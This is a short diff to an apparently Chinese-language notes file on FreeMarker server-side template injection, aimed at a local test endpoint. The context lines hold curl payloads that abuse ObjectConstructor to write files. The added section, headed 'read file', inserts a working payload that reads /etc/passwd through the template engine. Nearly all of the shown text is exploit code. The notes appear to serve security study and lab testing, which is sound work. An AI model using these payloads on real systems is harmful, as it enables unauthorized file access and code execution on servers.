@@ -132,6 +132,12 @@ curl 127.0.0.1:8080/freemarker/eval -d 'username="freemarker.template.utility.Ex
 curl 127.0.0.1:8080/freemarker/eval -d 'username="freemarker.template.utility.ObjectConstructor"?new()("java.io.FileWriter","/tmp/test.txt").append("123").close()'
 ```
 
+读文件
+
+```
+curl 127.0.0.1:8080/freemarker/unsafe -d 'template=<#assign+value="freemarker.template.utility.ObjectConstructor"?new()("java.io.FileReader", "/etc/passwd")>${"freemarker.template.utility.ObjectConstructor"?new()("java.util.Scanner", value).next()}'
+```
+
 执行SPEL
 
 ```
